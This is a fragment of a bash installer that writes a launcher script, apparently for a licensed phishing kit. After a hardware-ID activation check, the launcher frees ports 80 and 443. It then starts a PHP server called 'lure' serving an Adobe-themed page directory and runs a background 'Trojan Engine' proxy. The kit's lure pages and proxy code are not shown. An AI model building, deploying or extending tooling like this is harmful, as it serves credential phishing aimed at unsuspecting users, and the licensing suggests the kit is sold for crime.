# --- 6. CREATE THE PERMANENT RUN SCRIPT (FIXED) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
# Generate HWID
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026"
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

clear
echo -e "${BLUE}"
echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
echo " ----------------------------------------------------------------------------------"
echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"

# CHECK IF LICENSE EXISTS
if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        DAYS_LEFT=$(( ($EXPIRY_DATE - $CURRENT_DATE) / 86400 ))
        echo -e "${GREEN}[success] License Active ($DAYS_LEFT Days Remaining).${NC}"
        echo " ----------------------------------------------------------------------------------"
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${BLUE}[!] Trojan Engine is now LIVE in the background.${NC}"
        exit 0
    fi
fi

# IF NO VALID LICENSE, ASK FOR KEY
echo -e "${RED}[error] Hardware ID $HWID is not registered.${NC}"
read -p "ENTER ACTIVATION KEY: " USER_KEY

if [ "$USER_KEY" == "$VALID_KEY" ]; then
    EXPIRY=$(($CURRENT_DATE + 7776000))
    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
    sync # Force save to disk
    echo -e "${GREEN}[success] Activated! Restarting...${NC}"
    sleep 1
    exec /root/run.sh # Use exec to restart the script with the new license
else
    echo -e "${RED}[error] Invalid Key.${NC}"
    exit 1
fi
EOF
chmod +x /root/run.sh
